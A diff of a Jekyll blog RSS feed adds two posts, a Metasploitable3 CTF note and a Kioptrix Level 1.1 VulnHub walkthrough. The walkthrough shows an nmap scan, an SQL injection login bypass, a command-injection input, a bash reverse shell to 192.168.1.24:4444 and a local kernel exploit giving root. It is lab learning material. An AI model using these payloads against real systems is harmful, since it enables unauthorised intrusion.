@@ -5,9 +5,111 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 08 Jan 2018 15:50:38 +0100</pubDate>
-    <lastBuildDate>Mon, 08 Jan 2018 15:50:38 +0100</lastBuildDate>
+    <pubDate>Mon, 08 Jan 2018 16:02:41 +0100</pubDate>
+    <lastBuildDate>Mon, 08 Jan 2018 16:02:41 +0100</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>Metasploitable3 CTF Writeup</title>
+        <description>&lt;p&gt;Hello,&lt;/p&gt;
+
+&lt;p&gt;My dear Friend &lt;a href=&quot;https://twitter.com/R3dShift23&quot;&gt;R3d&lt;/a&gt; and I partecipated to the Rapid7 Metasploitable 3 CTF as 16667 team.&lt;/p&gt;
+
+&lt;p&gt;You can find our write-up &lt;a href=&quot;https://github.com/16667/Metasploitable-3-CTF&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-27-metasploitable3-ctf/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Wed, 27 Dec 2017 22:30:00 +0100</pubDate>
+        <link>http://localhost:4000/blog/metasploitable3-ctf/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/metasploitable3-ctf/</guid>
+        
+        <category>metasploitable</category>
+        
+        <category>rapid7</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>Kioptrix: Level 1.1 (#2) Writeup</title>
+        <description>&lt;p&gt;Hello all.&lt;/p&gt;
+
+&lt;p&gt;You can download Kioptrix  from Vulnhub.&lt;/p&gt;
+
+&lt;p&gt;As always I started to enumerate with nmap:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ nmap -sT -sV -p 1-65535 192.168.1.26
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-07 00:18 CET
+Nmap scan report for 192.168.1.26
+Host is up (0.0014s latency).
+Not shown: 65528 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+111/tcp  open  rpcbind  2 (RPC #100000)
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+631/tcp  open  ipp      CUPS 1.1
+788/tcp  open  status   1 (RPC #100024)
+3306/tcp open  mysql    MySQL (unauthorized)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;On port 80 there was this vulnerable login:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By using ‘ or 1=1 — – as username I successfully logged in:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There was this “Basic Administrative Web Console”.  By giving an ip address, it performed a ping command:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nice!!! It looked like a Command Injection Vulnerability!!! I succesfully executed a “ls” command by using this input:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;ls
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I opened a reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.24/4444 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Syrion:~ syrion$ nc -l 4444
+bash: no job control in this shell
+bash-3.00$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-3.00$ uname -a
+Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I noticed that this linux kernel version was vulnerable to this &lt;a href=&quot;https://www.exploit-db.com/exploits/9542/&quot;&gt;exploit&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.00$ gcc exp.c -o exp
+bash-3.00$ ./exp
+sh: no job control in this shell
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It was done!&lt;/p&gt;
+
+&lt;p&gt;Good bye!&lt;/p&gt;
+</description>
+        <pubDate>Sat, 07 Jan 2017 22:30:00 +0100</pubDate>
+        <link>http://localhost:4000/blog/kioptrix-level-1-1-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/kioptrix-level-1-1-writeup/</guid>
+        
+        <category>vulnhub</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Lamp Security CTF7 Writeup</title>
